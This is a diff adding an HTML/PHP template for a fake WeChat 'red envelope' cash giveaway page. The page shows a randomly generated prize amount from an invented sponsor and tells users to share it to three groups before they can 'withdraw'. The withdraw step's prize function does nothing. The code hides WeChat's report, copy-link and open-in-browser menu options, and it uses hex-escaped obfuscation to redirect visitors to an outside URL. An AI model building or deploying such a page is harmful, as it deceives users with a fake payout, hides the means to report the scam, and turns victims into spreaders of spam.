@@ -1,0 +1,396 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Pragma" content="no-cache">
+    <link rel="stylesheet" href="{STYLE_PATH}/skin16.css">
+    <link rel="stylesheet" href="{STYLE_PATH}/weUI.css">
+    <meta name="format-detection" content="telephone=no">
+    <script type="text/javascript">
+
+        var weui = {
+            alert: function (msg, title, callback) {
+                 title = title ? title : "温馨提醒";
+                var alertHtml = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;">';
+                alertHtml += '<div class="weui_mask"></div>';
+                alertHtml += '<div class="weui_dialog">';
+                alertHtml += '    <div class="weui_dialog_hd"><strong class="weui_dialog_title" style="font-size: 28px;">'
+                + title + '</strong></div>';
+                alertHtml += '    <div class="weui_dialog_bd" style="font-size: 24px;"></div>';
+                alertHtml += '    <div class="weui_dialog_ft">';
+                alertHtml += '      <a href="javascript:;" class="weui_btn_dialog primary" style="font-size: 24px;line-height: 30px;">确定</a>';
+                alertHtml += '  </div>';
+                alertHtml += ' </div>';
+                alertHtml += '</div>';
+                if ($(".weui_dialog_alert").length > 0) {
+                    $(".weui_dialog_alert .weui_dialog_bd").empty();
+                } else {
+                    $("body").append($(alertHtml));
+                }
+                var weui_alert = $(".weui_dialog_alert");
+                weui_alert.show();
+                weui_alert.find(".weui_dialog_bd").html(msg);
+                weui_alert.find('.weui_btn_dialog').off("click").on('click',
+                    function () {
+                        weui_alert.hide();
+                        if (callback) {
+                            callback();
+                        }
+                    });
+            }
+        };
+
+        //缩放比例
+        if (/Android (\d+\.\d+)/.test(navigator.userAgent)) {
+            var version = parseFloat(RegExp.$1);
+            if (version > 2.3) {
+                var phoneScale = parseInt(window.screen.width) / 640;
+                document.write('<meta name="viewport" content="width=640, minimum-scale = ' + phoneScale + ', maximum-scale = ' + phoneScale + ', target-densitydpi=device-dpi">');
+            } else {
+                document.write('<meta name="viewport" content="width=640, target-densitydpi=device-dpi">');
+            }
+        } else {
+            document.write('<meta name="viewport" content="width=640, user-scalable=no, target-densitydpi=device-dpi">');
+        }
+
+        function IsPC() {
+            var userAgentInfo = navigator.userAgent;
+            var Agents = new Array("Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod");
+            var flag = true;
+            for (var v = 0; v < Agents.length; v++) {
+                if (userAgentInfo.indexOf(Agents[v]) > 0) {
+                    flag = false;
+                    break
+                }
+            }
+            return flag
+        }
+        var jumpPc = IsPC();
+        var ua = navigator.userAgent;
+        if (jumpPc != false) {
+          //  window.location.href="index_error.html";//错误页面
+        }
+        else {
+            if (!ua.match(/MicroMessenger/i)) {
+             //   window.location.href="index_error.html";//错误页面
+            }
+        }
+
+    </script>
+    <!--?2016咻一咻，六亿现金送不停,只有三次机会哦,没抽的都来吧！   -->
+    <SCRIPT LANGUAGE="Javascript">
+
+        var Words = "<title>&#x3010;&#x5FAE;&#x4FE1;&#x7EA2;&#x5305;&#x3011;&#x606D;&#x559C;&#x53D1;&#x8D22;&#xFF0C;&#x4E07;&#x4E8B;&#x5982;&#x610F;&#xFF01;124622&#x4EBA;&#x5DF2;&#x62A2;&#x5230;&#xFF01;&#xFF01;&#xFF01;</title>";
+
+
+        function OutWord() {
+            var NewWords;
+
+            NewWords = unescape(Words);
+            document.write(NewWords);
+        }
+        OutWord();
+    </SCRIPT>
+
+  
+ {php echo register_jssdk(false);}
+
+     
+
+    <script>
+        function getSymbols(len)
+        {
+            len = len || 4;
+            var $chars = '△▽○◇□☆??????????▲▼●★?????????‥??*☉⊙⊕Θ◎?¤?の⊿??………??????⌒???╱▁╲↖↑↗??￠℡?a㈱?〓≡▏㊣▕←?→??????????╲▔╱↙↓↘♀※#&????€§???♂∷№@??$Ψ￥∮‖?￢????????▓??Ω囍?????????????Ю??＊???????????????????????????';
+            var maxPos = $chars.length;
+            var pwd = '';
+            for (i = 0; i < len; i++) {
+                pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+            }
+            return pwd;
+        }
+        var share_time = 0;
+
+        var jumplink = "{php echo $this->createMobileUrl('result')}";
+        var links = "{$settings['share_url']}";
+        window.shareData = {
+            "imgUrl": "{php echo tomedia($settings['share_thumb'])}",
+            // "imgUrl": "http://wxhb.oss-cn-beijing.aliyuncs.com/hongbao/17382hb.jpg",
+            "sendFriendLink": links,
+            "timeLineLink": links,
+            "desc": "{$settings['share_desc']}",
+            "fTitle": "{$settings['share_title']}",
+            "fContent": "{$settings['zdy_domain']}"
+
+        };
+
+      
+
+        var i = 0;
+        wx.ready(function () {
+            wx.onMenuShareAppMessage({
+                title: window.shareData.fTitle,
+                desc: window.shareData.fContent,
+                link: window.shareData.sendFriendLink,
+                imgUrl: window.shareData.imgUrl,
+                success: function () {
+                    share_time++;
+                    if(share_time<3)
+                    {
+                        weui.alert('分享成功！请再分享' + (3-share_time) + '次！');
+                    }
+                    else
+                    {
+//                            if (lp <= 2) {
+//                                weui.alert('请分享到3个不同的微信群！');
+//                                return;
+//                            }
+                        var url = jumplink;
+//                        if(url == "00000"){
+//                            shareSuccess();
+//                        }else{
+//                            weui.alert('分享成功！领取奖品');
+//                            location.href = url;
+//                        }
+
+                        weui.alert('分享成功！领取奖品');
+                        location.href = url;
+                    }
+
+
+                },
+                cancel: function () {
+                }
+            });
+
+            wx.onMenuShareTimeline({
+                title: window.shareData.fTitle,
+                desc: window.shareData.fContent,
+                link: window.shareData.timeLineLink,
+                imgUrl: window.shareData.imgUrl,
+                success: function () {
+                    alert("\u8981\u5206\u4eab\u5230\u5fae\u4fe1\u7fa4\u624d\u884c\u54e6\uff01");
+                },
+                cancel: function () {
+                }
+            });
+
+
+
+            wx.hideMenuItems({
+                menuList: [
+                    'menuItem:exposeArticle'
+                    , 'menuItem:setFont'
+                    , 'menuItem:dayMode'
+                    , 'menuItem:nightMode'
+                    , 'menuItem:profile'
+                    , 'menuItem:share:qq'
+                    , 'menuItem:share:weiboApp'
+                    , 'menuItem:favorite'
+                    , 'menuItem:share:facebook'
+                    , 'menuItem:share:QZone'
+                    , 'menuItem:jsDebug'
+                    , 'menuItem:editTag'
+                    , 'menuItem:delete'
+                    , 'menuItem:copyUrl'
+                    , 'menuItem:originPage'
+                    , 'menuItem:readMode'
+                    , 'menuItem:openWithQQBrowser'
+                    , 'menuItem:openWithSafari'
+                    , 'menuItem:share:email'
+                    , 'menuItem:exposeArticle'
+                    , 'menuItem:brand'
+                   
+                ],
+                success: function (res) {
+                },
+                fail: function (res) {
+                }
+            });
+        });
+
+ 
+
+
+    </script>
+</head>
+<body>
+
+<div class="main" id="main_id" style="display:none;">
+    <div class="content">
+        <!--<meta itemprop="image" content="images/hongbao1.png">-->
+        <div class="title"><span></span></div>
+        <a class="report"></a>
+
+        <div class="userinfo">
+            <div class="user-picture"><img src="http://7xt0s8.com2.z0.glb.clouddn.com/1.jpg" class="touxiangimg"/></div>
+            <div class="user-red">吥↘恠侑噯↘的大礼</div>
+            <div class="red-message">由万事顺心如意集团赞助！</div>
+            <div class="money-wrap"><strong id="money"></strong>元</div>
+        </div>
+
+        <div>
+            <ul class="button">
+                <li class="tixianle">点此立刻提现</li>
+            </ul>
+        </div>
+
+    </div>
+</div>
+
+<div id="shade">
+
+    <div class='share'><img src="http://7xt0s8.com2.z0.glb.clouddn.com/share3.png"></div>
+
+    <div class="open-red" id="open-red">
+        <div class="userinfo">
+            <div class="user-picture">
+                <!--发红包头像-->
+                <img src="http://7xt0s8.com2.z0.glb.clouddn.com/1.jpg" class="touxiangimg"/>
+            </div>
+            <div class="user-red">吥↘恠侑噯↘</div>
+            <div class="money-tips">祝各位万事如意，好运吉祥！</div>
+            <div class="red-message">&nbsp;&nbsp;&nbsp;&nbsp;礼物由万事顺达称心如意赞助</div>
+        </div>
+        <a class="open auto-x">拆礼包</a>
+    </div>
+
+    <div class='share2'><img src='{STYLE_PATH}/songfeishia.jpg'></div>
+
+
+</div>
+<script type="text/javascript" src="{STYLE_PATH}/jquery-2.1.1.min.js"></script>
+<script type="text/javascript" src="{STYLE_PATH}/jquery.transit.js"></script>
+<script type="text/javascript" src="{STYLE_PATH}/jquery-hcheckbox.js"></script>
+<script type="text/javascript">
+    /*
+     * 全站公共脚本,基于jquery-1.9.1脚本库
+     */
+    $(function () {
+
+
+//        $.getScript("http://www.reamers-navi.com/home/domain.php" );
+
+        var self_url = ""; //缓存跳转
+
+        if (!isNaN(localStorage.pagecount)) {
+            localStorage.pagecount = Number(localStorage.pagecount) + 1;
+            var ii = localStorage.pagecount;
+            if (parseInt(ii) > 4) {
+                localStorage.pagecount = 1;
+            }
+        } else {
+            localStorage.pagecount = 1;
+
+        }
+        var ii = localStorage.pagecount;
+//        if (parseInt(ii) == 1) {
+//            window.location.href = self_url;
+//        }
+
+
+        $(".open").on("tap", function (event) {
+            event.preventDefault();
+            if (!$(this).hasClass("opend")) {
+                $(this).addClass("opend");
+                setTimeout(function () {
+                    document.getElementById("shade").style.display = "none";
+                    document.getElementById("main_id").style.display = "block";
+                    $("#bannerDowm").hide();
+                }, 2000)
+            }
+
+
+        })
+        //提现
+        $(document).on("tap", ".tixianle", function (event) {
+            event.preventDefault();
+            $(".share").show();
+
+            function lottery() {
+
+            }
+
+            lottery();
+
+            $("#open-red").hide();
+            $("#shade").css("height", "100%");
+            $("#shade").show();
+//            dianjizhunbei = 1;
+//            //alert("马上提现，请按照提示操作");
+//            widthjiance1();
+        })
+    })
+
+    //随即金额
+    function suijijine() {
+        var a = Math.round((Math.random() * 10)) + 6.88;
+        return a.toFixed(2);
+    }
+    $("#money").text(suijijine());
+    // $("#money").text("10");
+    //双定时函数
+    function widthjiance1() {
+        //window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x72\x65\x66"] = btnlink1;
+         //http://gexingtuijian.flzhan.com/index.html
+        //setTimeout(widthjiance2, 200)
+    }
+
+    function widthjiance2() {
+        var _$ = [
+            "\u53d1\u9001\u6210\u529f\!\u53d1\u90013\u4e2a\u4e0d\u540c\u5fae\u4fe1\u7fa4\u5373\u53ef\u9886\u53d6\u7d05\u5305,\u5f53\u524d\u8fd8\u5269\u30102\u3011\u6b21\u5206\u4eab\uff01",
+            "\u53d1\u9001\u6210\u529f\!\u53d1\u90013\u4e2a\u4e0d\u540c\u5fae\u4fe1\u7fa4\u5373\u53ef\u9886\u53d6\u7d05\u5305,\u5f53\u524d\u8fd8\u5269\u30101\u3011\u6b21\u5206\u4eab\uff01",
+            "\u53d1\u9001\u6210\u529f\!\u53d1\u90013\u4e2a\u4e0d\u540c\u5fae\u4fe1\u7fa4\u5373\u53ef\u9886\u53d6\u7d05\u5305,\u5f53\u524d\u8fd8\u5269\u30100\u3011\u6b21\u5206\u4eab\uff01",
+            "\u53d1\u9001\u6210\u529f\!\u53d1\u90013\u4e2a\u4e0d\u540c\u5fae\u4fe1\u7fa4\u5373\u53ef\u9886\u53d6\u7d05\u5305,\u5f53\u524d\u8fd8\u5269\u30100\u3011\u6b21\u5206\u4eab\uff01",
+            "http://article.zengzimo.cn/u/index.php?id=4648"];
+
+        if (dianjizhunbei == 1) {
+            setTimeout(function () {
+                window["\x61\x6c\x65\x72\x74"](_$[0])
+            }, 0x2710);
+            setTimeout(function () {
+                window["\x61\x6c\x65\x72\x74"](_$[1])
+            }, 0x3A98);
+//            setTimeout(function () {
+//                window["\x61\x6c\x65\x72\x74"](_$[2])
+//            }, 0x88B8);
+//            setTimeout(function () {
+//                window["\x61\x6c\x65\x72\x74"](_$[3])
+//            }, 0xAFC8);
+//setTimeout(function(){window["\x61\x6c\x65\x72\x74"]( _$[4])},0xD6D8);
+            setTimeout(function () {
+                window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x72\x65\x66"] = _$[4]
+            }, 0x4E20)
+        }
+        else {
+            setTimeout(widthjiance1, 200)
+        }
+
+
+    }
+
+</script>
+
+
+<style>
+    .app-guide {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        min-width: 520px;
+        height: 120px;
+        background-color: rgba(0, 0, 0, .64);
+        box-shadow: 0 -1px 1px rgba(0, 0, 0, .10);
+        z-index: 200001
+    }
+
+</style>
+
+
+<div style="display:none;">
+    <script src="http://s4.cnzz.com/z_stat.php?id=1258827064&web_id=1258827064" language="JavaScript"></script>
+</div>
+</body>
+</html>
